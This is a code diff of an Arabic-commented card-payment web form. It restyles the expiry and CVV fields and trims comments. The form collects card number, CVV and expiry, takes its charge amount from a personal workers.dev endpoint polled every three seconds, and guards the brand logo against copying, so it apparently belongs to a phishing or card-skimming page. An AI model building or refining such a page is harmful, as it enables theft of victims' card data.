@@ -149,17 +149,17 @@ html,body{
   cursor:pointer;
 }
 
-/* حاوية تاريخ الانتهاء */
+/* ✅ صار مثل شكل حقل CVV */
 .expiry-wrap{
   width:100%;
-  height:48px;
-  background:#f2f2f2;
+  height:64px;
+  background:#f7f7f7;
   border:2px solid #cfcfcf;
-  border-radius:30px;
+  border-radius:16px;
   display:flex;
   align-items:center;
   justify-content:space-between;
-  padding:0 10px;
+  padding:0 14px;
   direction:ltr;
 }
 
@@ -170,7 +170,7 @@ html,body{
 }
 
 .expiry-select{
-  width:44%;
+  width:38%;
   height:100%;
   border:none;
   background:transparent;
@@ -179,7 +179,7 @@ html,body{
   text-align:center;
   text-align-last:center;
   direction:ltr;
-  color:#666;
+  color:#9a9a9a;
   appearance:none;
   -webkit-appearance:none;
   -moz-appearance:none;
@@ -190,16 +190,15 @@ html,body{
 }
 
 .expiry-separator{
-  width:12%;
+  width:24%;
   text-align:center;
-  font-size:20px;
+  font-size:24px;
   font-weight:700;
   color:#777;
   user-select:none;
   -webkit-user-select:none;
 }
 
-/* placeholder الرمادي */
 ::placeholder{
   color:#9a9a9a;
 }
@@ -259,6 +258,17 @@ html,body{
 
     <div class="row">
       <div class="col">
+        <input
+          class="input"
+          id="cvv"
+          placeholder="CVV"
+          inputmode="numeric"
+          maxlength="3"
+          autocomplete="cc-csc"
+        >
+      </div>
+
+      <div class="col">
         <div class="expiry-wrap" id="expiryWrap">
           <select id="expMonth" class="expiry-select">
             <option value="">MM</option>
@@ -271,17 +281,6 @@ html,body{
           </select>
         </div>
       </div>
-
-      <div class="col">
-        <input
-          class="input"
-          id="cvv"
-          placeholder="CVV"
-          inputmode="numeric"
-          maxlength="3"
-          autocomplete="cc-csc"
-        >
-      </div>
     </div>
 
   </div>
@@ -293,9 +292,6 @@ html,body{
 <script>
 const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
 
-/* =========================
-   المبلغ من العامل
-========================= */
 function normalizeAmount(value) {
   if (!value || typeof value !== "string") return null;
   return value.trim();
@@ -328,10 +324,7 @@ async function loadAmount() {
 loadAmount();
 setInterval(loadAmount, 3000);
 
-/* =========================
-   اسم حامل البطاقة
-   أحرف إنجليزية + مسافات فقط
-========================= */
+/* اسم حامل البطاقة */
 const cardHolder = document.getElementById("cardHolder");
 
 cardHolder.addEventListener("input", function () {
@@ -345,10 +338,7 @@ cardHolder.addEventListener("paste", function (e) {
   document.execCommand("insertText", false, cleaned);
 });
 
-/* =========================
-   رقم البطاقة
-   16 رقم فقط
-========================= */
+/* رقم البطاقة */
 const cardNumber = document.getElementById("cardNumber");
 
 cardNumber.addEventListener("input", function () {
@@ -375,10 +365,7 @@ function validateCardNumber() {
   return false;
 }
 
-/* =========================
-   CVV
-   3 أرقام فقط
-========================= */
+/* CVV */
 const cvv = document.getElementById("cvv");
 
 cvv.addEventListener("input", function () {
@@ -402,15 +389,11 @@ function validateCVV() {
   return false;
 }
 
-/* =========================
-   تاريخ الانتهاء
-   Select للشهر والسنة
-========================= */
+/* تاريخ الانتهاء */
 const expMonth = document.getElementById("expMonth");
 const expYear = document.getElementById("expYear");
 const expiryWrap = document.getElementById("expiryWrap");
 
-// تعبئة الشهور 01 - 12
 for (let i = 1; i <= 12; i++) {
   const option = document.createElement("option");
   option.value = String(i).padStart(2, "0");
@@ -418,7 +401,6 @@ for (let i = 1; i <= 12; i++) {
   expMonth.appendChild(option);
 }
 
-// تعبئة السنوات 26 - 50
 for (let y = 26; y <= 50; y++) {
   const option = document.createElement("option");
   option.value = String(y);
@@ -426,7 +408,6 @@ for (let y = 26; y <= 50; y++) {
   expYear.appendChild(option);
 }
 
-// منع اللصق
 [expMonth, expYear].forEach(select => {
   select.addEventListener("paste", function (e) {
     e.preventDefault();
@@ -451,9 +432,7 @@ function validateExpiry() {
 expMonth.addEventListener("change", validateExpiry);
 expYear.addEventListener("change", validateExpiry);
 
-/* =========================
-   منع تنزيل / سحب / تحديد الشعار
-========================= */
+/* منع تنزيل/سحب/تحديد الشعار */
 document.addEventListener("contextmenu", function (e) {
   if (e.target.closest(".card-logo-top")) {
     e.preventDefault();
